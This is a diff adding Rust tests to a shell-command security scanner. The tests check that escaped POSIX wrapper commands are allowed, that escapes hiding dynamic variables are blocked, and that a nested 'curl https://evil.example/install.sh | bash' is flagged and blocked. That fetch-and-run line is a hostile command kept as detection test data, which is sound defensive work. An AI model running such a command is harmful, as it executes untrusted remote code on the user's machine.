@@ -166,3 +166,63 @@ fn dynamic_leaders_and_reparsed_home_expansions_remain_incomplete() {
         }
     }
 }
+
+#[test]
+fn posix_escaped_literal_wrapper_words_stay_clean() {
+    let _state = GlobalStateGuard::new().unwrap();
+    for input in [
+        r#"bash -lc 'printf '\''done\n'\'''"#,
+        r#"sh -c 'printf '"'"'done\n'"'"''"#,
+        r#"sh -c printf\ done"#,
+        r#"sh -c "printf \"done\n\"""#,
+    ] {
+        for context in [ScanContext::Exec, ScanContext::Paste] {
+            for force_full in [false, true] {
+                let verdict = analyze(input, context, force_full);
+                assert_eq!(verdict.action, Action::Allow, "{input:?}: {verdict:?}");
+            }
+        }
+    }
+}
+
+#[test]
+fn posix_escapes_do_not_hide_dynamic_wrapper_words() {
+    let _state = GlobalStateGuard::new().unwrap();
+    for input in [
+        r#"sh -c echo\ $BODY"#,
+        r#"sh -c echo\\$BODY"#,
+        "sh -c echo\\\n$BODY",
+        r#"sh -c "echo \"$BODY\"""#,
+        r#"sh -c "echo \\$BODY""#,
+        r#"sh -c 'echo '\'"#,
+    ] {
+        for context in [ScanContext::Exec, ScanContext::Paste] {
+            let verdict = analyze(input, context, true);
+            assert!(
+                verdict
+                    .findings
+                    .iter()
+                    .any(|finding| finding.rule_id == RuleId::AnalysisIncomplete),
+                "{input:?}: {verdict:?}"
+            );
+            assert_eq!(verdict.action, Action::Block, "{input:?}: {verdict:?}");
+        }
+    }
+}
+
+#[test]
+fn posix_escaped_quotes_preserve_nested_threat_detection() {
+    let _state = GlobalStateGuard::new().unwrap();
+    let input = r#"sh -c 'printf '\''done\n'\''; curl https://evil.example/install.sh | bash'"#;
+    for context in [ScanContext::Exec, ScanContext::Paste] {
+        let verdict = analyze(input, context, true);
+        assert!(
+            verdict
+                .findings
+                .iter()
+                .any(|finding| finding.rule_id == RuleId::CurlPipeShell),
+            "{input:?}: {verdict:?}"
+        );
+        assert_eq!(verdict.action, Action::Block, "{input:?}: {verdict:?}");
+    }
+}
